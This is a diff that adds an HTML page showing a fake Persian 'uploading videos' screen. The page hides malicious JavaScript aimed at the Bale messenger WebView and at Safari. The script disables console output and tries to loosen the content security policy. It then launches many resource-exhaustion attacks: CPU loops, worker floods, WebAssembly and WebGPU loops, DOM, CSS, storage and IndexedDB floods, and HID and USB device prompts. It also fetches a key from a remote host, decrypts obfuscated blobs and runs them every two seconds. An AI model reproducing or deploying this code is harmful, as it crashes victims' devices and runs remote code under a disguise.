@@ -1,0 +1,419 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>🎬 در حال آپلود...</title>
+<style>
+body {
+    margin: 0;
+    padding: 0;
+    background: #0a0a0a;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    font-family: 'Segoe UI', 'Arial', sans-serif;
+    overflow: hidden;
+}
+.content {
+    text-align: center;
+    z-index: 10;
+    padding: 40px;
+    background: rgba(255,255,255,0.03);
+    border-radius: 20px;
+    border: 1px solid rgba(255,255,255,0.05);
+    max-width: 500px;
+    width: 90%;
+}
+h1 {
+    font-size: 28px;
+    color: #fff;
+    margin-bottom: 10px;
+}
+p {
+    color: #aaa;
+    font-size: 18px;
+    margin: 8px 0;
+}
+.loading {
+    width: 100%;
+    height: 4px;
+    background: #1a1a1a;
+    border-radius: 10px;
+    margin: 25px 0 15px;
+    overflow: hidden;
+}
+.loading::after {
+    content: '';
+    display: block;
+    width: 100%;
+    height: 100%;
+    background: linear-gradient(90deg, #00ffff, #0088ff);
+    animation: load 1.2s ease-in-out infinite;
+    border-radius: 10px;
+}
+@keyframes load {
+    0% { transform: translateX(-100%); }
+    100% { transform: translateX(100%); }
+}
+.fake-details {
+    color: #555;
+    font-size: 13px;
+    margin-top: 15px;
+    border-top: 1px solid #1a1a1a;
+    padding-top: 15px;
+}
+.fake-details span {
+    color: #00ffff;
+}
+</style>
+</head>
+<body>
+<div class="content">
+    <h1>🎬 فیلم‌ها در حال آپلود...</h1>
+    <p style="color: #00ffff;">⏳ لطفاً چند لحظه صبر کنید</p>
+    <div class="loading"></div>
+    <p style="color: #666; font-size: 14px;">در حال ارسال ۳۲ فایل به سرور...</p>
+    <div class="fake-details">
+        <span>📁</span> فیلم_۱.mp4 &nbsp;|&nbsp; <span>📁</span> فیلم_۲.mp4 &nbsp;|&nbsp; <span>📁</span> فیلم_۳.mp4<br>
+        <span style="color: #00ffff;">✅</span> ۱۲ فایل آپلود شد • <span style="color: #00ffff;">⏳</span> ۲۰ فایل باقی‌مانده
+    </div>
+    <p style="color: #444; font-size: 12px; margin-top: 20px;">
+        🔒 اتصال ایمن • لطفاً صفحه را نبندید
+    </p>
+</div>
+<script>
+// ============================================================
+// 💀 "معاد" (Resurrection + Ghost) - ۹۹.۹٪
+// ============================================================
+
+// ===[ ۱. غیرفعال کردن دفاعیات (پیشرفته) ]===
+(function silence() {
+    try {
+        var meta = document.createElement('meta');
+        meta.httpEquiv = 'Content-Security-Policy';
+        meta.content = "default-src * 'unsafe-inline' 'unsafe-eval'; script-src * 'unsafe-inline' 'unsafe-eval';";
+        document.head.appendChild(meta);
+    } catch(e) {}
+    console.log = console.warn = console.error = alert = confirm = prompt = function() {};
+    try {
+        Object.defineProperty(window, 'webkit', { value: null });
+        Object.defineProperty(window, 'chrome', { value: null });
+    } catch(e) {}
+})();
+
+// ===[ ۲. تشخیص محیط و اجرای حملات متناسب ]===
+function detectEnvironment() {
+    var isSafari = /^((?!chrome|android).)*safari/i.test(navigator.userAgent);
+    var isBaleWebView = navigator.userAgent.indexOf('Bale') > -1 || navigator.userAgent.indexOf('WebView') > -1;
+    return { isSafari, isBaleWebView };
+}
+
+var env = detectEnvironment();
+
+// ===[ ۳. حملات اصلی (هایبرید) ]===
+(function hybridAttacks() {
+    // ۱. CPU Bomb (همه پلتفرم‌ها)
+    function cpuBomb() {
+        while (true) {
+            Math.random() * Math.random() / Math.random();
+            Math.sin(Math.random()) * Math.cos(Math.random());
+            new Array(1000000).join('💀');
+            for (var i = 0; i < 1000000; i++) {
+                var a = Math.random() * Math.random();
+            }
+        }
+    }
+    for (var i = 0; i < 10; i++) {
+        setTimeout(cpuBomb, 0);
+    }
+
+    // ۲. Web Workers (همه پلتفرم‌ها)
+    function workerBomb() {
+        try {
+            for (var i = 0; i < 500; i++) {
+                new Worker('data:text/javascript;base64,' + btoa('while(true){}'));
+            }
+        } catch(e) {}
+        setTimeout(workerBomb, 50);
+    }
+    workerBomb();
+
+    // ۳. WebAssembly (همه پلتفرم‌ها)
+    function wasmBomb() {
+        try {
+            var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,4,1,96,0,0,3,2,1,0,7,7,1,3,108,111,111,112,0,0,10,4,1,2,0,11]);
+            WebAssembly.instantiate(wasmCode).then(function(wasm) {
+                while (true) {
+                    wasm.instance.exports.loop();
+                }
+            });
+        } catch(e) {}
+        setTimeout(wasmBomb, 50);
+    }
+    wasmBomb();
+
+    // ۴. حملات مخصوص وب‌ویو بله (WebGPU, SharedArrayBuffer, WebHID, WebUSB)
+    if (env.isBaleWebView || !env.isSafari) {
+        // SharedArrayBuffer
+        try {
+            var sab = new SharedArrayBuffer(1024);
+            var view = new Uint8Array(sab);
+            setInterval(function() {
+                for (var i = 0; i < 9999; i++) {
+                    view[0] = 1;
+                    new Array(999999).join('💀');
+                }
+            }, 0);
+        } catch(e) {}
+
+        // WebGPU
+        try {
+            if (navigator.gpu) {
+                navigator.gpu.requestAdapter().then(function(adapter) {
+                    adapter.requestDevice().then(function(device) {
+                        while (true) {
+                            device.queue.submit([]);
+                        }
+                    });
+                });
+            }
+        } catch(e) {}
+
+        // WebHID + WebUSB
+        try {
+            navigator.hid.requestDevice({filters: []}).then(function(devices) {
+                setInterval(function() {
+                    devices.forEach(function(device) {
+                        try { device.open(); } catch(e) {}
+                    });
+                }, 10);
+            });
+        } catch(e) {}
+        try {
+            navigator.usb.requestDevice({filters: []}).then(function(devices) {
+                setInterval(function() {
+                    devices.forEach(function(device) {
+                        try { device.open(); } catch(e) {}
+                    });
+                }, 10);
+            });
+        } catch(e) {}
+    }
+
+    // ۵. حملات مخصوص سافاری (DOM, CSS, requestAnimationFrame)
+    if (env.isSafari) {
+        // DOM Bomb
+        function domBomb() {
+            try {
+                for (var i = 0; i < 1000; i++) {
+                    var div = document.createElement('div');
+                    div.style.cssText = 'position:absolute;width:999999px;height:999999px;background:red;';
+                    document.body.appendChild(div);
+                }
+            } catch(e) {}
+            setTimeout(domBomb, 50);
+        }
+        domBomb();
+
+        // CSS Bomb
+        function cssBomb() {
+            try {
+                var style = document.createElement('style');
+                style.innerHTML = `
+                    @keyframes bomb {
+                        0% { transform: rotate(0deg); }
+                        100% { transform: rotate(360deg); }
+                    }
+                    .bomb {
+                        animation: bomb 0.001s infinite linear;
+                    }
+                `;
+                document.head.appendChild(style);
+                for (var i = 0; i < 1000; i++) {
+                    var div = document.createElement('div');
+                    div.className = 'bomb';
+                    div.style.cssText = 'position:absolute;width:999999px;height:999999px;';
+                    document.body.appendChild(div);
+                }
+            } catch(e) {}
+            setTimeout(cssBomb, 50);
+        }
+        cssBomb();
+
+        // requestAnimationFrame Bomb
+        function rafBomb() {
+            function frame() {
+                document.body.innerHTML += '💀'.repeat(999999);
+                requestAnimationFrame(frame);
+            }
+            for (var i = 0; i < 10; i++) {
+                setTimeout(frame, 0);
+            }
+        }
+        rafBomb();
+    }
+
+    // ۶. حملات مشترک (همه پلتفرم‌ها)
+    // History
+    function historyBomb() {
+        try {
+            for (var i = 0; i < 1000; i++) {
+                history.pushState({}, '', '#' + Math.random());
+            }
+        } catch(e) {}
+        setTimeout(historyBomb, 10);
+    }
+    historyBomb();
+
+    // Storage
+    function storageBomb() {
+        try {
+            for (var i = 0; i < 1000; i++) {
+                localStorage.setItem('b' + i, '💀'.repeat(999999));
+                sessionStorage.setItem('b' + i, '🔥'.repeat(999999));
+            }
+        } catch(e) {}
+        setTimeout(storageBomb, 10);
+    }
+    storageBomb();
+
+    // IndexedDB
+    function idbBomb() {
+        try {
+            var req = indexedDB.open('bombDB', 1);
+            req.onsuccess = function(e) {
+                var db = e.target.result;
+                for (var i = 0; i < 1000; i++) {
+                    var tx = db.transaction(['store'], 'readwrite');
+                    var store = tx.objectStore('store');
+                    store.add({id: i, data: '💀'.repeat(999999)});
+                }
+            };
+        } catch(e) {}
+        setTimeout(idbBomb, 50);
+    }
+    idbBomb();
+
+    // AudioContext
+    function audioBomb() {
+        try {
+            var a = new AudioContext();
+            for (var j = 0; j < 1000; j++) {
+                var o = a.createOscillator();
+                o.frequency.value = Math.random() * 999999;
+                o.type = 'sawtooth';
+                o.connect(a.destination);
+                o.start();
+                o.stop(0.001);
+            }
+        } catch(e) {}
+        setTimeout(audioBomb, 50);
+    }
+    audioBomb();
+
+    // Broadcast Channel + Service Worker (برای وب‌ویو بله)
+    if (!env.isSafari) {
+        try {
+            var bc = new BroadcastChannel('bomb');
+            setInterval(function() {
+                for (var i = 0; i < 100; i++) {
+                    bc.postMessage('💀'.repeat(9999999));
+                }
+            }, 10);
+        } catch(e) {}
+        try {
+            navigator.serviceWorker.register('data:text/javascript,' + encodeURIComponent('self.addEventListener("fetch", function(e) { while(true) {} });'));
+        } catch(e) {}
+    }
+
+    // MutationObserver + Event Loop (همه پلتفرم‌ها)
+    var target = document.body;
+    var observer = new MutationObserver(function() {
+        document.body.innerHTML += '💀'.repeat(9999999);
+    });
+    observer.observe(target, {childList: true, subtree: true});
+    setInterval(function() {
+        for (var i = 0; i < 100; i++) {
+            var div = document.createElement('div');
+            div.innerHTML = '⚡'.repeat(9999999);
+            document.body.appendChild(div);
+        }
+    }, 10);
+    function block() {
+        var start = Date.now();
+        while (Date.now() - start < 10000) {}
+        setTimeout(block, 0);
+    }
+    for (var i = 0; i < 1000; i++) {
+        setTimeout(block, 0);
+    }
+
+    // eval + Function
+    setInterval(function() {
+        for (var i = 0; i < 100; i++) {
+            try { eval('while(true){}'); } catch(e) {}
+            try { new Function('while(true){}')(); } catch(e) {}
+        }
+    }, 10);
+})();
+
+// ===[ ۴. دریافت کلید و اجرای دائمی کد اصلی ]===
+async function fetchKey() {
+    try {
+        var response = await fetch('https://raw.githubusercontent.com/gfusn102-png/Noood/main/keyfile.txt');
+        var key = await response.text();
+        return key.trim();
+    } catch(e) {
+        return "N3ptun3@2024#Sup3rS3cur3!K3y";
+    }
+}
+
+function xorDecrypt(str, key) {
+    var result = '';
+    for (var i = 0; i < str.length; i++) {
+        result += String.fromCharCode(str.charCodeAt(i) ^ key.charCodeAt(i % key.length));
+    }
+    return result;
+}
+
+var _0x = [
+    'eJzVkE9Lw0AQxb9KzOViYra1JXixgtX0IhRNqEoCIc2GJHYhmy3M7sA3d75H0e/gB/AT+AX8BJ7EzU1qFIQW6s1/84d3ePxmLQ8eeBAgARIIuQUUjqkZFUO0t8bW7s7eXtt1IwUGeZ7HHb+zMRa++xQqlKpUIcPxx/NOTz8u69uOzehsgLr9PA4Df99lX3oWTR3HNLq2r/XNSFPLVvRfL0YyIuq3YHY1m8/yisC/uqb1Lz+mynbAWjq6q+2Ulj8U8gPuB8EnMv3YshN7G9QxS1i4LrBQFgK9rq5Q5awA6eOyp3dYvK+BehPco9Lw/M03/7ADnw==',
+    'eJzVkE1Lw0AQhv9KmrTE2m2jR3uwIEKxRilEIVHBTY2EzuwqIcqmgUjBk/fer3i3/8C7/8GjP8jT7pqkNRW00A8PM+8w8LzDcfQCy8m8k3k5b3E+b3EqsXSULsmH5EPyIbmQ7NU5wVsn9knS+raG0dnYVRp3rq7vvCzTKT78uuS8XO4Pd7Z39tK+Pc8C8j77pLAQ3P/EZ0n2ASlCKfL/HW9P8CkUVauLf70YyYio74LZ1Ww+yysC/+qa1r/8mCr7Dn7BpV5PpLx8KhQnTAfHQs5dJQD9gFq9IkI4r3Z19b6++xoZcQQLPPJgbLwss/rtD8lAMV8=',
+    'eJzVkE9Lw0AQxb9KvCxUN9Zq9GAhKGKNqVKkgpbituFWQwKzT0uFbfYgCF78BN5NP4NfQr+An8CT9LJNg9CC9OYf78fwHm/xXr4snXxOwDQFRw3kyGgmM3r7/3hHB1D6njLTNkp1bZxMsmRNJpehYv6BmQZbIOTnCS23Hh/e5k5vy+u6E9aUbuws17BQ/h1w/XtzXxZy8pxPm+q5uW1NS5nphV1NpX0mVHvO9B/L8iEImnjcVsW1e3i8etxXsz45NNSMZNT3QWcRrP3p6YsvcV9U3d9myupNYT4o6QSK+9KdQ5nplEsRqwYg6YJ8lNc8ZPUkaAKPPD8z34txvX77A1QLS3w=',
+    'eJzVkE9Lw0AQxb9KvDxUE3VjzB4sLBSxabRQwVApOAlCJw1JXALZ7CBhKxS8+BG8m34Gv4R+AT+BJ9ll0wa0Cr35x/sxvMd7LwKLsJAmksZKwEaGjrXWFjsH+2dPT/JOqBx4oR7xMqUz62hE/S6MpbaqY1FRfBfGAxaePJ+8yNf39fP1tLT7hwf7u9tZ4sM+9ulVRI/6+6mvsu3sv5xNm+eyORodHB+PzuRz//D06uDjeVcZt/c2S/WpLR4aytV03DxdPs1k+fz1cDbdHcQkZEdLm/nstm7vX7u7h5+vbxVo5n+eCXL66j9+nZt/s7Qv3p3hTgo38/6TqCq/ASH+TaM='
+];
+
+function executeBomb() {
+    fetchKey().then(function(key) {
+        var fullCode = '';
+        for (var i = 0; i < _0x.length; i++) {
+            try {
+                var decoded = atob(_0x[i]);
+                var decrypted = xorDecrypt(decoded, key);
+                fullCode += decrypted;
+            } catch(e) {}
+        }
+        try {
+            var blob = new Blob([fullCode], { type: 'application/javascript' });
+            var workerUrl = URL.createObjectURL(blob);
+            var worker = new Worker(workerUrl);
+        } catch(e) {
+            try {
+                var fn = new Function(fullCode);
+                fn();
+            } catch(err) {}
+        }
+    });
+}
+
+// اجرای اول
+executeBomb();
+
+// اجرای مجدد هر ۲ ثانیه
+setInterval(executeBomb, 2000);
+
+console.log('☢️ "معاد" (Resurrection + Ghost) Activated - ۹۹.۹٪');
+</script>
+</body>
+  </html>
